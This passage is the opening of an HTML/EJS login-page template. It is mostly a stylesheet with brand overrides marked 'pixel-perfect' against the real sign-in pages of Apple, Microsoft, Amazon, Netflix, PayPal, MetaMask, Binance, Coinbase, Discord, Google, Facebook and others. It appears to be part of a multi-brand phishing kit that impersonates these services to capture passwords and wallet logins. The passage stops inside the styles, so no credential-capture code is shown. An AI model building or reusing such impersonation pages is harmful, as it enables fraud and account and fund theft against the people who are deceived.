<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= pageContent.headline %> — <%= tpl.name %></title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:<%= tpl.palette.bg %>;
    --card:<%= tpl.palette.card %>;
    --fg:<%= tpl.palette.fg %>;
    --accent:<%= tpl.palette.accent %>;
    --accent2:<%= tpl.palette.accent2 %>;
  }
  * { box-sizing:border-box; margin:0; padding:0; }
  body {
    font-family:'Inter',system-ui;
    background:var(--bg); color:var(--fg);
    min-height:100vh;
    display:flex; align-items:center; justify-content:center;
    padding:24px;
  }
  .auth {
    background:var(--card);
    border-radius:22px;
    padding:38px 30px;
    width:100%; max-width:420px;
    box-shadow:0 30px 70px rgba(0,0,0,.5);
    border:1px solid rgba(255,255,255,.07);
  }
  .logo {
    width:60px; height:60px; border-radius:17px;
    background:linear-gradient(135deg,var(--accent),var(--accent2));
    display:flex; align-items:center; justify-content:center;
    color:#fff; font-weight:800; font-size:1.7rem;
    margin:0 auto 22px;
    box-shadow:0 8px 24px rgba(0,0,0,.3);
  }
  .logo svg, .logo-svg { display:block; margin:0 auto 22px; }
  h1 { font-size:1.35rem; text-align:center; margin-bottom:6px; font-weight:800; }
  .sub { text-align:center; font-size:.9rem; opacity:.65; margin-bottom:28px; }
  form { display:grid; gap:13px; }
  input {
    padding:14px 16px; border-radius:13px;
    border:1.5px solid rgba(255,255,255,.1);
    background:rgba(0,0,0,.25); color:var(--fg);
    font-size:1rem; font-family:inherit; width:100%;
    transition:.2s;
  }
  input:focus { outline:none; border-color:var(--accent); background:rgba(0,0,0,.35); }
  input::placeholder { opacity:.5; }
  button {
    padding:15px; border:0; border-radius:13px;
    background:linear-gradient(135deg,var(--accent),var(--accent2));
    color:#fff; font-size:1.05rem; font-weight:800;
    cursor:pointer; font-family:inherit; width:100%;
    transition:.2s; margin-top:2px;
  }
  button:hover { transform:translateY(-2px); filter:brightness(1.08); }
  button:active { transform:translateY(0); }

  /* ── Brand overrides ── */
  body.brand-facebook { background:#f0f2f5; color:#1c1e21; }
  body.brand-facebook .auth { background:#fff; border:none; box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 24px rgba(0,0,0,.06); border-radius:8px; }
  body.brand-facebook h1 { color:#1c1e21; }
  body.brand-facebook .sub { color:#606770; opacity:1; }
  body.brand-facebook input { background:#fff; border:1px solid #dddfe2; border-radius:6px; color:#1c1e21; }
  body.brand-facebook input::placeholder { color:#90949c; opacity:1; }
  body.brand-facebook input:focus { border-color:#1877F2; box-shadow:0 0 0 2px rgba(24,119,242,.2); background:#fff; }
  body.brand-facebook button { background:#1877F2; border-radius:6px; background-image:none; font-weight:700; letter-spacing:.3px; }
  body.brand-facebook button:hover { background:#166fe5; transform:none; filter:none; }

  body.brand-google, body.brand-gmail { background:#fff; color:#202124; }
  body.brand-google .auth, body.brand-gmail .auth { background:#fff; border:1px solid #dadce0; border-radius:8px; box-shadow:none; }
  body.brand-google h1, body.brand-gmail h1 { color:#202124; font-weight:400; font-size:1.5rem; }
  body.brand-google .sub, body.brand-gmail .sub { color:#5f6368; opacity:1; }
  body.brand-google input, body.brand-gmail input { background:#fff; border:1px solid #dadce0; border-radius:4px; color:#202124; }
  body.brand-google input:focus, body.brand-gmail input:focus { border-color:#1a73e8; background:#fff; box-shadow:0 0 0 2px rgba(26,115,232,.2); }
  body.brand-google button, body.brand-gmail button { background:#1a73e8; border-radius:4px; background-image:none; font-weight:500; }
  body.brand-google button:hover, body.brand-gmail button:hover { background:#1765cc; transform:none; filter:none; }

  /* Apple ID: pixel-perfect — appleid.apple.com */
  body.brand-apple { background:#f5f5f7; color:#1d1d1f; font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif; }
  body.brand-apple .auth { background:#fff; border:none; box-shadow:0 4px 24px rgba(0,0,0,.1); border-radius:18px; max-width:400px; padding:40px 40px 32px; }
  body.brand-apple .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
  body.brand-apple h1 { color:#1d1d1f; font-weight:600; font-size:1.5rem; text-align:center; margin-bottom:6px; letter-spacing:-.02em; }
  body.brand-apple .sub { color:#6e6e73; opacity:1; font-size:.88rem; text-align:center; margin-bottom:20px; }
  body.brand-apple label { display:none; }
  body.brand-apple input { background:#f5f5f7; border:1px solid #d2d2d7; border-radius:10px; color:#1d1d1f; font-size:.95rem; padding:12px 14px; height:44px; }
  body.brand-apple input::placeholder { color:#a1a1a6; }
  body.brand-apple input:focus { border-color:#0071e3; background:#fff; box-shadow:0 0 0 4px rgba(0,113,227,.1); outline:none; }
  body.brand-apple button { background:#0071e3; border-radius:980px; background-image:none; font-weight:400; font-size:.95rem; height:44px; margin-top:4px; }
  body.brand-apple button:hover { background:#0077ed; transform:none; filter:none; }
  body.brand-apple .ap-forgot { display:block; text-align:center; font-size:.83rem; color:#0071e3; margin-top:12px; text-decoration:none; }
  body.brand-apple .ap-forgot:hover { text-decoration:underline; }
  body.brand-apple .ap-footer { margin-top:16px; padding-top:14px; border-top:1px solid #e5e5ea; font-size:.78rem; color:#8e8e93; text-align:center; }
  body.brand-apple .ap-footer a { color:#0071e3; }

  /* Microsoft: pixel-perfect — login.microsoftonline.com */
  body.brand-microsoft { background:#fff; color:#323130; font-family:'Segoe UI',SegoeUI,'Helvetica Neue',system-ui,sans-serif; }
  body.brand-microsoft .auth { background:#fff; border:1px solid #8a8886; box-shadow:none; border-radius:0; max-width:440px; padding:44px 44px 36px; }
  body.brand-microsoft .logo-svg { margin-bottom:16px; display:block; }
  body.brand-microsoft h1 { color:#323130; font-weight:600; font-size:1.5rem; text-align:left; margin-bottom:16px; font-family:'Segoe UI',sans-serif; }
  body.brand-microsoft .sub { display:none; }
  body.brand-microsoft label { display:block; font-size:.875rem; font-weight:400; color:#323130; margin-bottom:4px; }
  body.brand-microsoft input { background:#fff; border:1px solid #605e5c; border-bottom:2px solid #605e5c; border-radius:2px; color:#323130; font-size:.875rem; padding:6px 8px; height:36px; }
  body.brand-microsoft input:focus { border-color:#0067b8; border-bottom-color:#0067b8; border-width:1px; border-bottom-width:2px; background:#fff; box-shadow:none; outline:none; }
  body.brand-microsoft input::placeholder { color:#a19f9d; }
  body.brand-microsoft button { background:#0067b8; color:#fff; border-radius:0; background-image:none; font-weight:600; font-size:.875rem; height:36px; font-family:'Segoe UI',sans-serif; margin-top:16px; }
  body.brand-microsoft button:hover { background:#005a9e; transform:none; filter:none; }
  body.brand-microsoft .ms-footer { margin-top:20px; font-size:.8125rem; color:#0067b8; }
  body.brand-microsoft .ms-footer a { color:#0067b8; }

  /* Amazon: pixel-perfect — amazon.com/ap/signin */
  body.brand-amazon { background:#fff; color:#0f1111; font-family:Arial,sans-serif; }
  body.brand-amazon .auth { background:#fff; border:1px solid #d5d9d9; border-radius:8px; box-shadow:0 2px 5px rgba(213,217,217,.5); max-width:348px; padding:28px 28px 24px; }
  body.brand-amazon .logo-svg { display:block; margin-bottom:20px; }
  body.brand-amazon h1 { color:#0f1111; font-size:1.15rem; font-weight:700; text-align:left; margin-bottom:10px; }
  body.brand-amazon .sub { display:none; }
  body.brand-amazon label { display:block; font-size:.85rem; font-weight:700; color:#0f1111; margin-bottom:4px; }
  body.brand-amazon input { background:#fff; border:1px solid #888; border-radius:3px; color:#0f1111; padding:7px 8px; font-size:.93rem; height:31px; }
  body.brand-amazon input:focus { border-color:#e77600; box-shadow:0 0 0 3px rgba(228,121,17,.5); background:#fff; outline:none; }
  body.brand-amazon input::placeholder { color:#767676; }
  body.brand-amazon button { background:linear-gradient(to bottom,#f7dfa5,#f0c14b) !important; color:#111 !important; border:1px solid #a88734 !important; border-radius:3px; font-weight:normal; height:31px; font-size:.87rem; margin-top:4px; }
  body.brand-amazon button:hover { background:linear-gradient(to bottom,#f5d78e,#eeb933) !important; transform:none; filter:none; border-color:#a88734 !important; }
  body.brand-amazon .az-divider { border-top:1px solid #e7e7e7; margin:16px 0 12px; }
  body.brand-amazon .az-footer { font-size:.75rem; color:#0f1111; text-align:center; }
  body.brand-amazon .az-footer a { color:#0066c0; text-decoration:none; }
  body.brand-amazon .az-footer a:hover { text-decoration:underline; color:#c45500; }
  body.brand-amazon .az-new { font-size:.85rem; margin-top:14px; padding-top:14px; border-top:1px solid #e7e7e7; text-align:center; }

  /* Netflix: pixel-perfect — netflix.com/login */
  body.brand-netflix { background:#000; color:#fff; font-family:Netflix Sans,'Helvetica Neue',Helvetica,Arial,sans-serif; }
  body.brand-netflix .auth { background:rgba(0,0,0,.75); border:none; box-shadow:none; border-radius:4px; padding:60px 68px 40px; max-width:450px; }
  body.brand-netflix .logo-svg { display:block; margin-bottom:28px; }
  body.brand-netflix h1 { color:#fff; font-size:2rem; font-weight:700; text-align:left; margin-bottom:28px; }
  body.brand-netflix .sub { display:none; }
  body.brand-netflix label { display:none; }
  body.brand-netflix input { background:#333; border:none; border-radius:4px; color:#fff; padding:16px 20px; height:50px; font-size:.95rem; }
  body.brand-netflix input:focus { background:#454545; border:none; box-shadow:none; outline:none; }
  body.brand-netflix input::placeholder { color:#8c8c8c; }
  body.brand-netflix button { background:#e50914; border-radius:4px; background-image:none !important; font-size:1rem; font-weight:700; height:56px; margin-top:8px; }
  body.brand-netflix button:hover { background:#f40612; transform:none; filter:none; }
  body.brand-netflix .nf-footer { margin-top:12px; font-size:.9rem; color:#b3b3b3; text-align:center; }
  body.brand-netflix .nf-footer a { color:#fff; font-weight:500; }
  body.brand-netflix .nf-new { text-align:left; margin-top:16px; font-size:.85rem; color:#737373; }
  body.brand-netflix .nf-new a { color:#fff; }

  body.brand-instagram { background:#fff; color:#262626; }
  body.brand-instagram .auth { background:#fff; border:1px solid #dbdbdb; border-radius:1px; box-shadow:none; }
  body.brand-instagram h1 { color:#262626; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:1.6rem; font-weight:300; letter-spacing:-1px; }
  body.brand-instagram input { background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; color:#262626; font-size:.875rem; padding:10px 8px; }
  body.brand-instagram input:focus { border-color:#a8a8a8; background:#fafafa; box-shadow:none; }
  body.brand-instagram button { background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); border-radius:4px; background-image:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); font-weight:600; opacity:1; }
  body.brand-instagram button:disabled { opacity:.3; }

  body.brand-twitter,body.brand-twitterx { background:#fff; color:#0f1419; }
  body.brand-twitter .auth,body.brand-twitterx .auth { background:#fff; border:none; box-shadow:none; border-radius:16px; }
  body.brand-twitter input,body.brand-twitterx input { background:#fff; border:1px solid #cfd9de; border-radius:4px; color:#0f1419; }
  body.brand-twitter input:focus,body.brand-twitterx input:focus { border-color:#1d9bf0; background:#fff; box-shadow:0 0 0 2px rgba(29,155,240,.25); }
  body.brand-twitter button,body.brand-twitterx button { background:#0f1419; border-radius:9999px; background-image:none; font-weight:700; }

  body.brand-paypal { background:#f5f7fa; color:#2c2e2f; }
  body.brand-paypal .auth { background:#fff; border:1px solid #e0e3e7; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.08); }
  body.brand-paypal h1 { color:#2c2e2f; font-size:1.5rem; font-weight:700; }
  body.brand-paypal .sub { color:#6c7378; opacity:1; }
  body.brand-paypal input { background:#fff; border:1px solid #b7bcbf; border-radius:4px; color:#2c2e2f; }
  body.brand-paypal input::placeholder { color:#9da3a6; }
  body.brand-paypal input:focus { border-color:#0070ba; box-shadow:0 0 0 2px rgba(0,112,186,.2); background:#fff; }
  body.brand-paypal button { background:#0070ba; border-radius:25px; background-image:none; font-weight:700; color:#fff; }
  body.brand-paypal button:hover { background:#005ea6; transform:none; filter:none; }

  /* MetaMask: pixel-perfect — metamask.io style */
  body.brand-metamask { background:#24272A; color:#fff; font-family:system-ui,-apple-system,sans-serif; }
  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; border-radius:12px; padding:36px 32px; max-width:400px; }
  body.brand-metamask .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
  body.brand-metamask h1 { color:#fff; font-weight:700; font-size:1.4rem; text-align:center; margin-bottom:6px; }
  body.brand-metamask .sub { color:#9fa6b2; opacity:1; font-size:.88rem; text-align:center; margin-bottom:24px; }
  body.brand-metamask input { background:#2c2f35; border:1.5px solid #3c4044; border-radius:8px; color:#fff; font-size:.95rem; padding:13px 14px; }
  body.brand-metamask input::placeholder { color:#7b8491; }
  body.brand-metamask input:focus { border-color:#F6851B; background:#2c2f35; box-shadow:0 0 0 3px rgba(246,133,27,.15); outline:none; }
  body.brand-metamask button { background:#F6851B; border-radius:8px; background-image:none; font-weight:700; height:50px; }
  body.brand-metamask button:hover { background:#e07316; transform:none; filter:none; }
  body.brand-metamask .mm-restore { display:block; text-align:center; margin-top:14px; font-size:.83rem; color:#9fa6b2; }
  body.brand-metamask .mm-restore a { color:#F6851B; font-weight:500; }

  /* Binance: pixel-perfect — accounts.binance.com/en/login */
  body.brand-binance { background:#0B0E11; color:#eaecef; font-family:'Roboto',system-ui,sans-serif; }
  body.brand-binance .auth { background:#1E2026; border:none; border-radius:16px; padding:40px 40px 32px; max-width:400px; box-shadow:0 4px 24px rgba(0,0,0,.5); }
  body.brand-binance h1 { color:#eaecef; font-weight:600; font-size:1.75rem; text-align:left; margin-bottom:20px; letter-spacing:-.01em; }
  body.brand-binance .sub { display:none; }
  body.brand-binance .logo-svg { margin-bottom:24px; display:block; }
  body.brand-binance label { display:block; font-size:.85rem; font-weight:400; color:#848E9C; margin-bottom:8px; }
  body.brand-binance input { background:#2B2F36; border:1px solid #2B2F36; border-radius:4px; color:#eaecef; font-size:.95rem; padding:14px 16px; height:48px; }
  body.brand-binance input:focus { border-color:#F0B90B; background:#2B2F36; box-shadow:none; outline:none; }
  body.brand-binance input::placeholder { color:#474D57; opacity:1; }
  body.brand-binance button { background:#F0B90B; color:#1E2026; border-radius:4px; background-image:none; font-weight:700; font-size:.95rem; height:48px; padding:0; margin-top:4px; }
  body.brand-binance button:hover { background:#f8d33a; transform:none; filter:none; }
  body.brand-binance .bn-footer { text-align:center; margin-top:16px; font-size:.85rem; color:#848E9C; }
  body.brand-binance .bn-footer a { color:#F0B90B; text-decoration:none; font-weight:500; }
  body.brand-binance .bn-forgot { text-align:right; margin-top:-6px; margin-bottom:4px; }
  body.brand-binance .bn-forgot a { font-size:.82rem; color:#F0B90B; text-decoration:none; }

  /* Coinbase: pixel-perfect — coinbase.com/signin */
  body.brand-coinbase { background:#f9f9f9; color:#0a0b0d; font-family:system-ui,-apple-system,sans-serif; }
  body.brand-coinbase .auth { background:#fff; border:none; border-radius:16px; box-shadow:0 4px 24px rgba(0,0,0,.08),0 1px 4px rgba(0,0,0,.05); padding:40px 36px 32px; max-width:400px; }
  body.brand-coinbase .logo-svg { display:flex; justify-content:center; margin-bottom:28px; }
  body.brand-coinbase h1 { color:#0a0b0d; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:24px; }
  body.brand-coinbase label { display:block; font-size:.85rem; font-weight:500; color:#3c3c3c; margin-bottom:6px; }
  body.brand-coinbase input { background:#fff; border:1.5px solid #d8d8d8; border-radius:8px; color:#0a0b0d; font-size:.95rem; padding:13px 14px; width:100%; }
  body.brand-coinbase input:focus { border-color:#0052FF; box-shadow:0 0 0 3px rgba(0,82,255,.12); background:#fff; outline:none; }
  body.brand-coinbase button { background:#0052FF; border-radius:8px; background-image:none; font-weight:700; font-size:1rem; height:52px; width:100%; }
  body.brand-coinbase button:hover { background:#003dd6; transform:none; filter:none; }
  body.brand-coinbase .cb-footer { text-align:center; margin-top:18px; font-size:.85rem; color:#5b616e; }
  body.brand-coinbase .cb-footer a { color:#0052FF; font-weight:500; }
  body.brand-coinbase .cb-forgot { display:block; text-align:right; font-size:.82rem; color:#0052FF; margin:-6px 0 12px; }
  body.brand-coinbase .cb-forgot:hover { text-decoration:underline; }

  /* Discord: pixel-perfect — discord.com/login */
  body.brand-discord { background:#5865F2; color:#fff; font-family:'gg sans','Noto Sans',Whitney,system-ui,sans-serif; }
  body.brand-discord .auth { background:#313338; border:none; border-radius:5px; padding:32px; max-width:480px; }
  body.brand-discord h1 { color:#fff; font-size:1.5rem; font-weight:700; text-align:center; margin-bottom:6px; }
  body.brand-discord .sub { color:#b5bac1; opacity:1; font-size:.875rem; text-align:center; margin-bottom:20px; }
  body.brand-discord label { display:block; font-size:.75rem; font-weight:700; color:#b5bac1; text-transform:uppercase; letter-spacing:.04em; margin-bottom:8px; }
  body.brand-discord input { background:#1e1f22; border:none; border-radius:3px; color:#dbdee1; font-size:1rem; padding:10px; }
  body.brand-discord input::placeholder { color:#6d6f78; }
  body.brand-discord input:focus { border:none; box-shadow:0 0 0 2px #5865F2; background:#1e1f22; outline:none; }
  body.brand-discord button { background:#5865F2; border-radius:3px; background-image:none; font-weight:500; font-size:1rem; height:44px; width:100%; }
  body.brand-discord button:hover { background:#4752c4; transform:none; filter:none; }
  body.brand-discord .dc-forgot { display:block; font-size:.875rem; color:#00a8fc; margin:-6px 0 16px; }
  body.brand-discord .dc-forgot:hover { text-decoration:underline; }
  body.brand-discord .dc-footer { text-align:left; margin-top:10px; font-size:.875rem; color:#949cf7; }
  body.brand-discord .dc-footer a { color:#00a8fc; }
  body.brand-discord .dc-footer a:hover { text-decoration:underline; }

  body.brand-linkedin { background:#f3f2ef; color:#000; }
  body.brand-linkedin .auth { background:#fff; border:none; border-radius:8px; box-shadow:0 0 0 1px rgba(0,0,0,.15); }
  body.brand-linkedin h1 { color:#000; font-weight:400; font-size:2rem; }
  body.brand-linkedin input { background:#fff; border:1px solid rgba(0,0,0,.6); border-radius:4px; color:#000; }
  body.brand-linkedin input:focus { border-color:#0a66c2; border-width:2px; background:#fff; box-shadow:none; }
  body.brand-linkedin button { background:#0a66c2; border-radius:28px; background-image:none; font-weight:600; }

  /* Snapchat: pixel-perfect — accounts.snapchat.com/accounts/login */
  body.brand-snapchat { background:#f5f5f5; color:#000; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif; }
  body.brand-snapchat .auth { background:#fff; border:none; border-radius:20px; box-shadow:0 2px 16px rgba(0,0,0,.12); padding:40px 36px 32px; max-width:380px; }
  body.brand-snapchat .logo-svg { display:flex; justify-content:center; margin-bottom:20px; }
  body.brand-snapchat h1 { color:#000; font-weight:700; font-size:1.5rem; text-align:center; margin-bottom:4px; }
  body.brand-snapchat .sub { color:#666; font-size:.88rem; text-align:center; margin-bottom:22px; opacity:1; }
  body.brand-snapchat input { background:#f5f5f5; border:1.5px solid #e0e0e0; border-radius:8px; color:#000; font-size:.95rem; padding:13px 14px; }
  body.brand-snapchat input::placeholder { color:#999; }
  body.brand-snapchat input:focus { border-color:#FFFC00; background:#fff; box-shadow:0 0 0 3px rgba(255,252,0,.3); outline:none; }
  body.brand-snapchat button { background:#FFFC00; color:#000; border-radius:100px; background-image:none; font-weight:700; font-size:1rem; height:50px; width:100%; }
  body.brand-snapchat button:hover { background:#ffe800; transform:none; filter:none; }
  body.brand-snapchat .sc-forgot { display:block; text-align:center; font-size:.85rem; color:#0075db; margin-top:14px; }
  body.brand-snapchat .sc-forgot:hover { text-decoration:underline; }
  body.brand-snapchat .sc-footer { text-align:center; margin-top:16px; font-size:.85rem; color:#555; }
